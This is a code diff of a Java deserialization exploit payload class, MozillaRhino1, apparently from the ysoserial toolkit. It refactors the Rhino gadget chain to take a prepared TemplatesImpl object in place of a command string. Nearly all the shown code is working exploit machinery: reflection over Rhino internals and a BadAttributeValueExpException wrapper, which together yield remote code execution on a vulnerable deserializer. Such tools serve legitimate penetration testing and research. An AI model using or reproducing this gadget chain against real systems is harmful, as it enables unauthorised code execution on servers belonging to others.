@@ -22,10 +22,10 @@ import java.lang.reflect.Method;
 @PayloadTest( precondition = "isApplicableJavaVersion")
 @Dependencies({"rhino:js:1.7R2"})
 @Authors({ Authors.MATTHIASKAISER })
-public class MozillaRhino1 implements ObjectPayload<Object> {
+public class MozillaRhino1 extends ParameterizedTransletObjectPayload<Object> {
 
-    public Object getObject(final String command) throws Exception {
-
+    @Override
+    protected Object getObject(final Object templates) throws Exception {
         Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
         Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
         Reflections.setAccessible(nativeErrorConstructor);
@@ -55,7 +55,7 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
         Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
         getter.set(slot, memberboxes);
 
-        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command), TemplatesImpl.class);
+        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject,templates, TemplatesImpl.class);
         idScriptableObject.setPrototype(nativeObject);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
